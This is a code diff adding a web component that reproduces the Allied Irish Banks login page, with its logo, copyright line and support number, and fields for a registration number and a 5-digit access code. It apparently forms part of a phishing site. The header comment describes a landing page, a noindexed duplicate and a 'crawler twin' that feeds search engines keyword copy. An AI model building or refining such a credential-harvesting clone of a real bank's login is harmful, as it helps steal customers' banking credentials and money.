@@ -1,0 +1,299 @@
+---
+/**
+ * The login card — markup and styles only, **no script**.
+ *
+ * Shared by three surfaces so they cannot drift:
+ *   `/`               the canonical, indexable human landing
+ *   `/login.html`     legacy duplicate (same UI, `noindex`, canonical → `/`)
+ *   `/crawler-seo`    the crawler twin (`interactive={false}` + SEO copy)
+ *
+ * Because the twin renders THIS component, desktop and mobile parity is
+ * structural rather than eyeballed: the card, the logo, the form chrome, the
+ * breakpoints and the CSS are literally the same file.
+ *
+ * `interactive={false}` removes every affordance that could run code — the
+ * anchors lose their `href`, the inputs become readonly+disabled — while
+ * keeping the exact same class names, so the CSS renders identically.
+ */
+import { PAGE_H1_HEADING } from "../lib/seo-keywords.js";
+
+interface Props {
+  interactive?: boolean;
+  /** Optional visible service description. The twin passes it; the landing does not. */
+  intro?: string;
+  /** Optional visible keyword block, rendered directly after the form. */
+  keywords?: string[];
+}
+
+const { interactive = true, intro, keywords = [] } = Astro.props;
+
+const hasIntro = Boolean(intro);
+const hasKeywords = keywords.length > 0;
+---
+
+<div class="ping-container ping-signin login-template">
+  {
+    interactive && (
+      <div id="aibTroubleLoggingInRegView">
+        <div class="aib_btn-close-container">
+          <button class="aib_btn-close" title="Close" tabindex="0">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              viewBox="0 0 24 24"
+              width="24"
+              height="24"
+            >
+              <path d="M13.4,12l5.2,5.3c0.4,0.4,0.4,1,0,1.4c-0.2,0.2-0.4,0.3-0.7,0.3c-0.3,0-0.5-0.1-0.7-0.3L12,13.4l-5.2,5.3 C6.6,18.9,6.3,19,6.1,19s-0.5-0.1-0.7-0.3c-0.4-0.4-0.4-1,0-1.4l5.2-5.3l-5.2-5.3 c-0.4-0.4-0.4-1,0-1.4c0.4-0.4,1-0.4,1.4,0l5.2,5.3l5.2-5.3 c0.4-0.4,1-0.4,1.4,0c0.4,0.4,0.4,1,0,1.4L13.4,12z" />
+            </svg>
+          </button>
+        </div>
+        <h2 class="aib_trouble-title">Contact us</h2>
+        <div class="aib_trouble-text">
+          Please contact us for assistance on<br />
+          <a href="tel:0818724724" class="aib_phone-link"><strong>0818 724 724</strong></a>
+        </div>
+        <div class="aib_btn-gotit-container">
+          <a href="javascript:void(0);" class="aib_btn-gotit" title="Close" tabindex="0">Got it</a>
+        </div>
+      </div>
+    )
+  }
+
+  <header class="ping-header">
+    <span class="company-logo">
+      <img
+        src="/images/aib-logo.png"
+        alt="AIB"
+        width="70"
+        height="70"
+        style="border-radius:8px;background:linear-gradient(45deg,#512d6d 0%,#c42f9e 80%);padding:10px;object-fit:contain;"
+      />
+    </span>
+    <h1>{PAGE_H1_HEADING}</h1>
+  </header>
+
+  <div class="ping-body-container">
+    <main>
+      <form method="POST" action="#" autocomplete="off" id="loginForm">
+        {
+          interactive && (
+            <div style="position:absolute;left:-9999px;top:-9999px" aria-hidden="true">
+              <input type="text" name="website" id="hp_field" tabindex="-1" autocomplete="off" />
+            </div>
+          )
+        }
+        <div class="ping-messages" id="statusArea"></div>
+
+        <label id="usernamelabel" for="username" class="ping-input-label">
+          Registration number<span aria-label="required">*</span>
+        </label>
+        <div class="ping-input-container">
+          <input
+            id="username"
+            type="text"
+            size="36"
+            name="username"
+            autocorrect="off"
+            autocapitalize="off"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            aria-required="true"
+            readonly={!interactive}
+            disabled={!interactive}
+          />
+        </div>
+
+        <label for="password" class="ping-input-label">
+          5-digit Personal Access Code (PAC)<span aria-label="required">*</span>
+        </label>
+        <div class="ping-input-container password-container">
+          <input
+            id="password"
+            type="password"
+            size="36"
+            name="password"
+            inputmode="numeric"
+            pattern="[0-9]*"
+            maxlength="5"
+            autocomplete="new-password"
+            aria-required="true"
+            readonly={!interactive}
+            disabled={!interactive}
+          />
+        </div>
+
+        <div class="ping-buttons">
+          {
+            interactive ? (
+              <a href="javascript:void(0);" id="loginBtn" class="ping-button normal allow" title="Log in" tabindex="0">
+                <span class="ping-btn-label">Log in</span>
+              </a>
+            ) : (
+              <a class="ping-button normal allow" aria-disabled="true">
+                <span class="ping-btn-label">Log in</span>
+              </a>
+            )
+          }
+          {
+            interactive ? (
+              <a href="/?default-login=" class="ping-button normal deny" title="Cancel" tabindex="0">
+                Cancel
+              </a>
+            ) : (
+              <a class="ping-button normal deny" aria-disabled="true">
+                Cancel
+              </a>
+            )
+          }
+        </div>
+
+        {
+          interactive ? (
+            <button type="button" class="aib_btn-more-information" tabindex="0">
+              Trouble logging in?
+            </button>
+          ) : (
+            <span class="aib_btn-more-information" aria-disabled="true">Trouble logging in?</span>
+          )
+        }
+      </form>
+
+      <div class="aib_links-hlp-contain">
+        {
+          interactive ? (
+            <>
+              <a href="#" class="aib_links-hlp">Terms</a>
+              <span class="aib_links-hlp-delimit">|</span>
+              <a href="#" class="aib_links-hlp">Help</a>
+            </>
+          ) : (
+            <>
+              <span class="aib_links-hlp">Terms</span>
+              <span class="aib_links-hlp-delimit">|</span>
+              <span class="aib_links-hlp">Help</span>
+            </>
+          )
+        }
+      </div>
+
+      {
+        hasIntro && (
+          <p class="aib-srp-intro" data-seo="description">
+            {intro}
+          </p>
+        )
+      }
+
+      {
+        hasKeywords && (
+          <section class="aib-srp-related" data-seo="keywords">
+            <h2 class="aib-srp-related-heading">Related searches</h2>
+            <p class="aib-srp-related-body">Related searches: {keywords.join(", ")}</p>
+          </section>
+        )
+      }
+    </main>
+  </div>
+
+  <div class="ping-footer-container">
+    <footer class="ping-footer">
+      <div class="aib-credits"></div>
+      <div class="aib-copyright">&copy; 2026 Allied Irish Banks, p.l.c. All rights reserved.</div>
+    </footer>
+  </div>
+</div>
+
+<style is:global>
+  .tooltip-text.type-alert { display: none !important; }
+  *{box-sizing:border-box}
+  html{background:#f2f2f2;background-color:#f2f2f2}
+  svg,object{stroke-width:0;stroke:currentColor;fill:currentColor}
+  h1{margin:0;color:#4d4d4d}
+
+  .aib_tpl .ping-header{font-family:"ProximaNovaBold",sans-serif;font-size:24px!important;color:#4d4d4d;padding-top:40px!important;border-radius:8px 8px 0 0;box-shadow:0 4px 6px rgba(0,0,0,.1)}
+  .aib_tpl .ping-header .company-logo{margin-bottom:12px}
+  .aib_tpl .ping-body-container{padding:32px;border-radius:0 0 8px 8px;box-shadow:0 5px 6px rgba(0,0,0,.1)}
+  .aib_tpl .ping-messages{font-size:14px;margin-bottom:14px}
+  .aib_tpl .ping-messages .ping-error{
+    color:#ed3a03;
+    font-family:"ProximaNovaRegular",sans-serif;
+    font-size:14px;
+    line-height:20px;
+    word-wrap:break-word;
+    margin:0 0 16px 0;
+    text-align:left;
+  }
+  .aib_tpl .divider{opacity:.4}
+  .aib_tpl .ping-header .company-logo{display:block;margin-bottom:12px;max-width:100%!important;height:auto!important}
+  .aib_tpl .bg-purple-core{border-radius:2px;background:#512d6d;background:linear-gradient(45deg,rgba(81,45,109,1) 0%,rgba(196,47,158,1) 80%)}
+
+  .aib_tpl .ping-input-label{display:block;float:none;text-transform:none;color:#000;opacity:.8}
+  .aib_tpl .ping-input-container input[type=text],
+  .aib_tpl .ping-input-container input[type=password]{font-family:"ProximaNovaBold",sans-serif;font-size:16px;background:#FFF;color:#000;height:56px;border-radius:8px;border:1px solid rgba(0,0,0,0.24);-webkit-appearance:none;width:100%!important}
+  .aib_tpl .ping-input-container input[type=text]:focus,
+  .aib_tpl .ping-input-container input[type=password]:focus{border:1px solid #7e2b79;box-shadow:inset 0 0 0 1px #7e2b79}
+  .aib_tpl .ping-input-container input[readonly]{opacity:.85}
+
+  .aib_tpl .ping-buttons{width:100%}
+  .aib_tpl .ping-buttons a.ping-button{height:48px;border-radius:8px;font-size:16px;letter-spacing:.4px;line-height:48px;display:inline-block;text-decoration:none;width:46%}
+  .aib_tpl .ping-buttons a.ping-button.allow{background-color:#00846a;font-family:"ProximaNovaBold",sans-serif;float:right;color:#fff}
+  .aib_tpl .ping-buttons a.ping-button.deny{color:rgba(0,0,0,.6);background:rgba(0,0,0,.05);font-family:"ProximaNovaRegular",sans-serif;float:left}
+  .aib_tpl .ping-buttons a.ping-button.deny:hover{text-decoration:none}
+  .aib_tpl .ping-buttons a.ping-button[aria-disabled]{cursor:default}
+
+  .aib_tpl .aib_btn-more-information{display:inline-block;font-family:"ProximaNovaBold",sans-serif;letter-spacing:.4px;font-size:16px;line-height:20px;margin:28px 0 0;text-decoration:underline;color:#7e2b79;height:48px;border:none;padding:14px 12px;border-radius:8px;outline:none;cursor:pointer;background:none}
+  .aib_tpl span.aib_btn-more-information{cursor:default}
+  .aib_tpl .aib_links-hlp-contain{text-align:center}
+  .aib_tpl .aib_links-hlp{display:inline-block;font-family:"ProximaNovaBold",sans-serif;letter-spacing:.4px;font-size:14px;margin:20px 0 0;text-decoration:underline;color:#666;border:none;padding:4px;border-radius:8px;outline:none}
+  .aib_tpl .aib_links-hlp-delimit{color:#000;opacity:.4;display:inline-block;margin:0 8px}
+
+  #aibTroubleLoggingInRegView{display:none;height:75%;background:#fff;max-width:480px;margin:0 auto;position:absolute;left:0;right:0;z-index:2;border-radius:8px;box-shadow:0 5px 6px rgba(0,0,0,.1)}
+  #aibTroubleLoggingInRegView.show{display:block}
+  .aib_tpl .aib_btn-close-container{height:auto;text-align:right}
+  .aib_tpl .aib_btn-close{width:32px;height:32px;display:inline-block;padding:4px;margin:12px;outline:none;border-radius:8px;color:#000;cursor:pointer;background:none;border:none}
+  .aib_tpl .aib_trouble-title{font-family:"ProximaNovaBold",sans-serif;font-size:20px;text-align:center;color:#000;opacity:.6;padding:20px;width:84%;line-height:26px;margin:0 auto}
+  .aib_tpl .aib_trouble-text{font-family:"ProximaNovaRegular",sans-serif;font-size:16px;text-align:center;line-height:24px;color:#000;padding:16px 20px}
+  .aib_tpl .aib_btn-gotit-container{text-align:center;padding:24px 20px}
+  .aib_tpl .aib_btn-gotit{font-family:"ProximaNovaBold",sans-serif;background-color:#00846a;color:#fff;height:48px;border-radius:8px;font-size:16px;letter-spacing:.4px;line-height:48px;display:inline-block;text-decoration:none;padding:0 80px;outline:none;cursor:pointer}
+  .aib_phone-link{display:inline-block;font-family:"ProximaNovaBold",sans-serif;letter-spacing:.4px;font-size:16px;line-height:20px;text-decoration:underline;color:#7e2b79;height:40px;border:none;padding:10px 12px;border-radius:8px;outline:none}
+
+  .ping-status{text-align:center;padding:16px 0;font-family:"ProximaNovaRegular",sans-serif;font-size:14px;line-height:20px;border-radius:8px;margin-top:16px}
+  .ping-status.info{background:#e8f5e9;color:#2e7d32}
+  .ping-status.error{background:#fce4ec;color:#c62828}
+  .ping-status.warning{background:#fff8e1;color:#f57f17}
+  .ping-status-spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(0,0,0,.2);border-top-color:#00846a;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .ping-button.disabled{opacity:.5;pointer-events:none}
+  /* Loading state lives on the button itself: the label is hidden and a
+     spinner is centred in its place, so no separate status message is
+     needed while the request is in flight. */
+  .ping-button.is-loading{opacity:.75;pointer-events:none}
+  .ping-button.is-loading .ping-btn-label{visibility:hidden}
+  .ping-button.is-loading::after{
+    content:"";position:absolute;top:50%;left:50%;
+    width:18px;height:18px;margin:-9px 0 0 -9px;
+    border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+    border-radius:50%;animation:spin .8s linear infinite;
+  }
+
+  /* Crawler-visible SEO copy. Rendered as ordinary body text: never
+     `sr-only`, never `display:none`, never zero opacity. */
+  .aib-srp-intro{margin:24px 0 0;font-family:"ProximaNovaRegular",sans-serif;font-size:15px;line-height:22px;color:rgba(0,0,0,.75)}
+  .aib-srp-related{margin:24px 0 0;padding-top:16px;border-top:1px solid rgba(0,0,0,.12)}
+  .aib-srp-related-heading{margin:0 0 6px;font-family:"ProximaNovaBold",sans-serif;font-size:14px;color:#4d4d4d;text-transform:none}
+  .aib-srp-related-body{margin:0;font-family:"ProximaNovaRegular",sans-serif;font-size:14px;line-height:21px;color:rgba(0,0,0,.75)}
+
+  .aib-copyright{font-family:"ProximaNovaRegular",sans-serif;font-size:12px;line-height:18px;color:rgba(0,0,0,.6)}
+
+  @media (max-width:480px),(max-device-width:480px){
+    html{background:#fff;background-color:#fff}
+    .aib_tpl .ping-header{border-radius:0;box-shadow:none}
+    .aib_tpl .ping-body-container{padding:20px 16px;border-radius:0;box-shadow:none}
+    .aib_tpl .ping-buttons a.ping-button{width:100%}
+    .aib_tpl .ping-buttons a.ping-button.allow,
+    .aib_tpl .ping-buttons a.ping-button.deny{float:none}
+    #aibTroubleLoggingInRegView{height:100%;border-radius:0;box-shadow:none}
+    .aib_tpl .aib_btn-gotit{width:100%}
+  }
+</style>
